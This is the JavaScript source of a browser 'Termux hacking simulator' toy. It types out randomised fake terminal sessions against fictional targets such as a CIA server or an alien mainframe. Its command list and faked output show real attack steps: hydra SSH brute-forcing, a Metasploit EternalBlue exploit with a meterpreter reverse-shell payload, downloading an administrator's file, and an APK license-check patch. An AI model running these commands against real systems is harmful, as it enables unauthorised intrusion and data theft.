// ==============================================
// HACKING SIMULATOR - TERMUX STYLE
// ==============================================
const hackOutput = document.getElementById('hackOutput');
const startHackBtn = document.getElementById('startHackBtn');
const clearHackBtn = document.getElementById('clearHackBtn');
const hackTarget = document.getElementById('hackTarget');

// Target data
const targetData = {
    cia: {
        name: 'CIA Server',
        ip: ['192.168.1.100', '10.0.0.50', '172.16.0.1', '203.0.113.1', '198.51.100.1'],
        ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
        passwords: ['C1A#S3cr3t', 'S3cr3t#2025', 'CIA#H@ck3r', 'T0p#Secret', 'Classified#1'],
        files: ['247', '512', '89', '1024', '666', '345', '789', '123'],
        secrets: ['Project Phoenix', 'Hidden Marketplace', 'Gold Reserve 3.2B', 'Operation X', 'Galactic Map', 'Area 51 Files', 'Alien Tech', 'CIA Blacklist'],
        size: ['8.2 MB', '12.4 MB', '6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB']
    },
    darkweb: {
        name: 'Dark Web',
        ip: ['10.0.0.100', '192.168.0.50', '172.16.0.100', '203.0.113.50', '198.51.100.50'],
        ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
        passwords: ['D@rk#2025', 'D@rk#H@ck3r', 'D@rk#Web', 'D@rk#Secret', 'D@rk#Code'],
        files: ['512', '89', '1024', '666', '345', '789', '123', '247'],
        secrets: ['Hidden Marketplace', 'Dark Web Secrets', 'Black Market Deals', 'Darknet Files', 'Crypto Wallets', 'Silk Road Data', 'Dark Web Links'],
        size: ['12.4 MB', '6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB']
    },
    bank: {
        name: 'Bank System',
        ip: ['192.168.1.200', '10.0.0.100', '172.16.0.200', '203.0.113.100', '198.51.100.200'],
        ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
        passwords: ['B@nk#Secure', 'B@nk#2025', 'B@nk#H@ck3r', 'B@nk#Secret', 'B@nk#Code'],
        files: ['89', '1024', '666', '345', '789', '123', '247', '512'],
        secrets: ['Gold Reserve 3.2B', 'Bank Accounts', 'Financial Records', 'Transaction Logs', 'Secure Vault', 'Client Data', 'Credit Card Info'],
        size: ['6.7 MB', '15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB']
    },
    government: {
        name: 'Government',
        ip: ['172.16.0.1', '192.168.0.200', '10.0.0.200', '203.0.113.200', '198.51.100.200'],
        ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
        passwords: ['G0v#Classified', 'G0v#Secret', 'G0v#H@ck3r', 'G0v#2025', 'G0v#Code'],
        files: ['1024', '666', '345', '789', '123', '247', '512', '89'],
        secrets: ['Operation X', 'National Security', 'Classified Files', 'Military Data', 'Government Secrets', 'Pentagon Files', 'White House Data'],
        size: ['15.8 MB', '9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB', '6.7 MB']
    },
    alien: {
        name: 'Alien Mainframe',
        ip: ['203.0.113.1', '198.51.100.1', '192.168.1.250', '10.0.0.250', '172.16.0.250'],
        ports: ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'],
        passwords: ['4l13n#C0de', '4l13n#2025', '4l13n#H@ck3r', '4l13n#Secret', '4l13n#Code'],
        files: ['666', '345', '789', '123', '247', '512', '89', '1024'],
        secrets: ['Galactic Map', 'Alien Tech', 'UFO Data', 'Extraterrestrial Files', 'Area 51 Secrets', 'Mars Files', 'Roswell Data'],
        size: ['9.1 MB', '11.3 MB', '7.6 MB', '14.2 MB', '8.2 MB', '12.4 MB', '6.7 MB', '15.8 MB']
    }
};

// Termux commands for output
const termuxCommands = [
    'pkg update && pkg upgrade -y',
    'pkg install python git nmap hydra metasploit apktool -y',
    'git clone https://github.com/AbhiTheModder/APK-Modder',
    'cd APK-Modder',
    'python3 apk_modder.py -t target.apk -o hacked.apk',
    'ls -la',
    'nmap -sV -p- IP_ADDRESS',
    'hydra -l root -P password.txt ssh://IP_ADDRESS',
    'msfconsole -q',
    'use exploit/windows/smb/eternalblue',
    'set RHOSTS IP_ADDRESS',
    'set PAYLOAD windows/x64/meterpreter/reverse_tcp',
    'set LHOST IP_ADDRESS',
    'run',
    'sysinfo',
    'getuid',
    'shell',
    'whoami',
    'dir',
    'exit',
    'download C:/Users/Administrator/Desktop/secret.txt',
    'exit',
    'python3 server.py',
    'exit',
    'logout'
];

const successMessages = [
    'SUCCESS ACCESS GRANTED!',
    'SUCCESS SYSTEM COMPROMISED!',
    'SUCCESS HACK COMPLETE!',
    'SUCCESS MISSION COMPLETE!',
    'SUCCESS ACCESS GRANTED!'
];

const failMessages = [
    'ERROR Target not responding',
    'ERROR Connection timeout',
    'ERROR Firewall blocking all ports',
    'ERROR Intrusion detected',
    'ERROR Access denied',
    'ERROR Permission denied',
    'ERROR Security breach detected',
    'ERROR All ports closed',
    'ERROR Target system patched',
    'ERROR Exploit failed',
    'ERROR Payload rejected',
    'ERROR Shellcode injection failed',
    'ERROR EDR blocked the attack',
    'ERROR Firewall rule blocked connection',
    'ERROR Connection refused',
    'ERROR Authentication failed',
    'ERROR Access denied',
    'ERROR System compromised... NOT',
    'ERROR You have been detected',
    'ERROR Trace in progress...',
    'ERROR IP logged',
    'ERROR Authorities notified'
];

const caughtMessages = [
    'ALERT WARNING: Unauthorized access detected',
    'ALERT System logging your activity',
    'ALERT Firewall blocking all ports',
    'ALERT Security breach detected',
    'ALERT All ports closed',
    'ALERT Exploit failed',
    'ALERT Payload rejected',
    'ALERT Shellcode injection failed',
    'ALERT EDR blocked the attack',
    'ALERT Firewall rule blocked connection',
    'ALERT Connection refused',
    'ALERT Authentication failed',
    'ALERT Access denied',
    'ALERT System compromised... NOT',
    'ALERT You have been detected',
    'ALERT Trace in progress...',
    'ALERT IP logged',
    'ALERT Authorities notified',
    'ALERT Your system is being tracked',
    'ALERT Close this browser immediately',
    'ALERT RUN!'
];

const tryAgainMessages = [
    'INFO System ready',
    'INFO Connection established',
    'INFO Sending exploit payload...',
    'WARN Payload partially delivered',
    'ERROR Exploit incomplete',
    'ERROR System rebooting',
    'ERROR All ports closed',
    'ERROR Authentication failed',
    'ERROR Access denied',
    'ERROR Try again later',
    'ERROR System patched',
    'ERROR Exploit blocked',
    'ERROR Connection lost',
    'ERROR Target unreachable',
    'ERROR Access denied',
    'ERROR Permission denied',
    'ERROR Try again',
    'ERROR Try again',
    'ERROR Try again',
    'ERROR Try again'
];

// Get random item from array
function randomItem(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// Get random IP
function getRandomIP() {
    return Math.floor(Math.random() * 255) + '.' + 
           Math.floor(Math.random() * 255) + '.' + 
           Math.floor(Math.random() * 255) + '.' + 
           Math.floor(Math.random() * 255);
}

// Get random port
function getRandomPort() {
    const ports = ['22', '80', '443', '3306', '8080', '21', '23', '445', '3389', '5900'];
    return randomItem(ports);
}

// Get random output based on result type
function getResultOutput(type, target) {
    const data = targetData[target];
    const ip = randomItem(data.ip);
    const port = randomItem(data.ports);
    const password = randomItem(data.passwords);
    const files = randomItem(data.files);
    const secret = randomItem(data.secrets);
    const size = randomItem(data.size);
    const targetName = data.name;
    
    let output = '';
    const userIP = getRandomIP();
    
    if (type === 'success') {
        output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `[INFO] Starting APK Modder v3.2.0
[INFO] Target APK: target.apk
[INFO] Analyzing APK structure...
[INFO] Decompiling APK...
[INFO] APK decompiled successfully
[INFO] Searching for license validation...
[INFO] License validation found at smali/com/example/MainActivity.smali
[INFO] Patching license check...
[INFO] Original code: if-eqz v0, :cond_12
[INFO] Patched code: const/4 v0, 0x1
[INFO] Recompiling APK...
[INFO] APK recompiled successfully
[INFO] Signing APK...
[INFO] APK signed successfully
[SUCCESS] APK hacked successfully!
[SUCCESS] Output: hacked.apk
[SUCCESS] Size: ${size}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `total ${size}
drwx------ 7 u0_a148 u0_a148 4096 Jun 15 12:34 .
drwx------ 3 u0_a148 u0_a148 4096 Jun 15 12:30 ..
-rw------- 1 u0_a148 u0_a148 4.2 MB Jun 15 12:34 target.apk
-rw------- 1 u0_a148 u0_a148 ${size} Jun 15 12:35 hacked.apk
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
Nmap scan report for ${ip}
Host is up (0.005s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE     VERSION
${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `Hydra v9.5 (c) 2024 by van Hauser/THC
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
[DATA] max 16 tasks per 1 server, overall 16 tasks, 1234 login tries (l:1/p:1234), ~78 tries per task
[DATA] attacking ssh://${ip}:22/
[STATUS] 242.00 tries/min, 242 tries in 00:01h, 992 to do in 00:05h
[22][ssh] host: ${ip}   login: root   password: ${password}
1 of 1 target successfully completed, 1 valid password found
Hydra finished at 2024-06-15 12:38:12
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
RHOSTS => ${ip}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
LHOST => ${userIP}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}

[*] Started reverse TCP handler on ${userIP}:4444 
[*] ${ip}:445 - Connecting to target for exploitation.
[+] ${ip}:445 - Connection established for exploitation.
[+] ${ip}:445 - Target OS selected valid for OS indicated by SMB reply
[*] ${ip}:445 - CORE raw buffer dump (42 bytes)
[*] ${ip}:445 - 0x00000000  57 69 6e 64 6f 77 73 20 38 2e 31 20 52 32 20 41  Windows 8.1 R2 A
[*] ${ip}:445 - 0x00000010  6d 64 36 34 20 36 2e 33 20 39 36 30 30 20 0d 0a  md64 6.3 9600 ..
[+] ${ip}:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] ${ip}:445 - Trying exploit with 12 Groom Allocations.
[+] ${ip}:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] Sending stage (200774 bytes) to ${ip}
[*] Meterpreter session 1 opened (${userIP}:4444 -> ${ip}:49158)

meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
Computer    : WIN-8R2A
OS          : Windows 8.1 R2 (Build 9600)
Architecture: x64
System Language : en_US
Domain      : WORKGROUP
Logged On Users : 2
Meterpreter : x64/windows

meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
Server username: NT AUTHORITY\\SYSTEM

meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
Process 5824 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
nt authority\\system

C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
 Volume in drive C has no label.
 Volume Serial Number is 1234-5678

 Directory of C:\\Windows\\system32

06/15/2024  12:45 PM    <DIR>          .
06/15/2024  12:45 PM    <DIR>          ..
06/15/2024  12:45 PM    <DIR>          config
06/15/2024  12:45 PM    <DIR>          drivers
06/15/2024  12:45 PM    <DIR>          en-US
06/15/2024  12:45 PM    <DIR>          oobe
06/15/2024  12:45 PM    <DIR>          sysprep
06/15/2024  12:45 PM    <DIR>          wbem
               0 File(s)              0 bytes
               8 Dir(s)  12,345,678,901 bytes free

C:\\Windows\\system32> ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}

meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
[*] downloading: C:/Users/Administrator/Desktop/secret.txt -> secret.txt
[*] downloaded 2.34 MB of 2.34 MB (100.0%)
[*] download complete!

meterpreter > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
[*] Shutting down Meterpreter...

$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
 * Serving Flask app 'server'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:5000
 * Running on http://${userIP}:5000
Press CTRL+C to quit
[2024-06-15 12:46:12] "GET / HTTP/1.1" 200 -
[2024-06-15 12:46:15] "GET /favicon.ico HTTP/1.1" 404 -
[2024-06-15 12:46:20] "GET /admin HTTP/1.1" 200 -
[2024-06-15 12:46:25] "POST /login HTTP/1.1" 302 -
[2024-06-15 12:46:30] "GET /dashboard HTTP/1.1" 200 -
[2024-06-15 12:46:35] "GET /logout HTTP/1.1" 200 -

$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
logout

${randomItem(successMessages)}
🔑 Password: ${password}
📁 Files: ${files}
📂 Secret: "${secret}"
✅ SYSTEM COMPROMISED!`;
    }
    
    if (type === 'fail') {
        output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `[INFO] Starting APK Modder v3.2.0
[INFO] Target APK: target.apk
[ERROR] Target APK not found!
[ERROR] File not found: target.apk
[ERROR] Please provide a valid APK file
[ERROR] Exiting...
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `Starting Nmap 7.80 ( https://nmap.org ) at 2024-06-15 12:34
Nmap scan report for ${ip}
Host is up (0.005s latency).
Not shown: 999 closed ports
PORT     STATE SERVICE     VERSION
${port}/tcp   open  ssh         OpenSSH 8.9p1 Ubuntu 3ubuntu0.1
${getRandomPort()}/tcp   open  http        Apache httpd 2.4.52
${getRandomPort()}/tcp   open  https       Apache httpd 2.4.52
${getRandomPort()}/tcp   open  mysql       MySQL 8.0.35
${getRandomPort()}/tcp   open  http-proxy  Apache Tomcat 9.0.56
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `Hydra v9.5 (c) 2024 by van Hauser/THC
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-15 12:35:12
[ERROR] Connection refused
[ERROR] Target unreachable
[ERROR] All ports closed
[ERROR] Authentication failed
[ERROR] Access denied
[ERROR] Permission denied
[ERROR] Target system patched
[ERROR] Exploit blocked
[ERROR] Firewall rule blocked connection
[ERROR] EDR detected attack
[ERROR] Connection lost
[ERROR] Target unreachable
[ERROR] Access denied
[ERROR] Permission denied
[ERROR] Security breach detected
[ERROR] Intrusion detected
[ERROR] System logging your activity
[ERROR] Authorities notified
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `msf6 > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
RHOSTS => ${ip}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
LHOST => ${userIP}
msf6 exploit(windows/smb/eternalblue) > ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}

[*] Started reverse TCP handler on ${userIP}:4444 
[*] ${ip}:445 - Connecting to target for exploitation.
[ERROR] Connection timed out
[ERROR] Target not responding
[ERROR] Exploit failed
[ERROR] Payload rejected
[ERROR] Shellcode injection failed
[ERROR] EDR blocked the attack
[ERROR] Firewall rule blocked connection
[ERROR] Authentication failed
[ERROR] Access denied
[ERROR] System compromised... NOT
[ERROR] You have been detected
[ERROR] Trace in progress...
[ERROR] IP logged
[ERROR] Authorities notified

$ exit
logout

❌ HACK FAILED!
⚠️ Target detected your activity
🔒 All ports blocked
🚫 Access denied`;
    }
    
    if (type === 'caught') {
        output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `[INFO] Starting APK Modder v3.2.0
[INFO] Target APK: target.apk
[ALERT] WARNING: Unauthorized access detected
[ALERT] System logging your activity
[ALERT] Firewall blocking all ports
[ALERT] Security breach detected
[ALERT] All ports closed
[ALERT] Exploit failed
[ALERT] Payload rejected
[ALERT] Shellcode injection failed
[ALERT] EDR blocked the attack
[ALERT] Firewall rule blocked connection
[ALERT] Connection refused
[ALERT] Authentication failed
[ALERT] Access denied
[ALERT] System compromised... NOT
[ALERT] You have been detected
[ALERT] Trace in progress...
[ALERT] IP logged
[ALERT] Authorities notified
[ALERT] Your system is being tracked
[ALERT] Close this browser immediately
[ALERT] RUN!
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `[ALERT] WARNING: Unauthorized access detected
[ALERT] System logging your activity
[ALERT] Firewall blocking all ports
[ALERT] Security breach detected
[ALERT] All ports closed
[ALERT] Exploit failed
[ALERT] Payload rejected
[ALERT] Shellcode injection failed
[ALERT] EDR blocked the attack
[ALERT] Firewall rule blocked connection
[ALERT] Connection refused
[ALERT] Authentication failed
[ALERT] Access denied
[ALERT] System compromised... NOT
[ALERT] You have been detected
[ALERT] Trace in progress...
[ALERT] IP logged
[ALERT] Authorities notified
[ALERT] Your system is being tracked
[ALERT] Close this browser immediately
[ALERT] RUN!

🚨 CAUGHT!
👮 Authorities notified
📍 IP traced: ${userIP}
🔒 All connections blocked
💀 System compromised... NOT!`;
    }
    
    if (type === 'tryagain') {
        output = `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `$ ${randomItem(termuxCommands).replace('IP_ADDRESS', ip)}
`;
        output += `[INFO] Starting APK Modder v3.2.0
[INFO] Target APK: target.apk
[INFO] Analyzing APK structure...
[INFO] Decompiling APK...
[INFO] APK decompiled successfully
[INFO] Searching for license validation...
[ERROR] License validation not found
[ERROR] APK may be already patched
[ERROR] Exploit incomplete
[ERROR] System rebooting
[ERROR] All ports closed
[ERROR] Authentication failed
[ERROR] Access denied
[ERROR] Try again later
[ERROR] System patched
[ERROR] Exploit blocked
[ERROR] Connection lost
[ERROR] Target unreachable
[ERROR] Access denied
[ERROR] Permission denied
[ERROR] Try again
[ERROR] Try again
[ERROR] Try again
[ERROR] Try again
[ERROR] Try again
[ERROR] Try again

$ exit
logout

🔄 TRY AGAIN!
⚠️ System not ready
⏳ Target unreachable
🔁 Retry your hack attempt`;
    }
    
    return output;
}

// Start hack function
function startHack() {
    const target = hackTarget.value;
    const results = ['success', 'success', 'success', 'fail', 'caught', 'tryagain'];
    const result = randomItem(results);
    
    hackOutput.textContent = '';
    hackOutput.style.color = '#66ff99';
    
    const lines = getResultOutput(result, target).split('\n');
    let lineIndex = 0;
    
    function typeLine() {
        if (lineIndex < lines.length) {
            hackOutput.textContent += lines[lineIndex] + '\n';
            hackOutput.scrollTop = hackOutput.scrollHeight;
            lineIndex++;
            const delay = lines[lineIndex] && lines[lineIndex].includes('$') ? 100 : 30;
            setTimeout(typeLine, delay);
        } else {
            // Final result color
            if (result === 'success') {
                hackOutput.style.color = '#00ff41';
            } else if (result === 'fail') {
                hackOutput.style.color = '#ff4444';
            } else if (result === 'caught') {
                hackOutput.style.color = '#ffaa00';
            } else {
                hackOutput.style.color = '#66ff99';
            }
        }
    }
    
    startHackBtn.disabled = true;
    startHackBtn.textContent = '⏳ HACKING...';
    typeLine();
    
    setTimeout(() => {
        startHackBtn.disabled = false;
        startHackBtn.textContent = '🚀 START HACK';
    }, 15000);
}

// Clear hack output
function clearHack() {
    hackOutput.textContent = '$ Welcome to Termux Hacking Simulator\n$ Select a target and click START HACK\n$ Commands will run automatically...';
    hackOutput.style.color = '#66ff99';
}

// Event listeners
startHackBtn.addEventListener('click', startHack);
clearHackBtn.addEventListener('click', clearHack);
